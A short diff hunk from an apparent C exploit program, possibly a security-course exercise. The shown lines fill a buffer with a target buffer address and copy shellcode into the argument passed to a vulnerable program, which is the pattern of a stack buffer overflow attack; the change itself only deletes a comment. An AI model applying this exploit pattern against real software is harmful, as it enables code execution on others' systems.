@@ -34,7 +34,6 @@ main ( int argc, char * argv[] )
             // Fill string with address of buffer
             *(ptr++) = (int) bufAddr; 
         }
-        // Need to start at 4 because of the targ += strlen(targ)
         for (i = 0; i < strlen(shellcode); ++i) {
             args[1][i] = shellcode[i];
         }
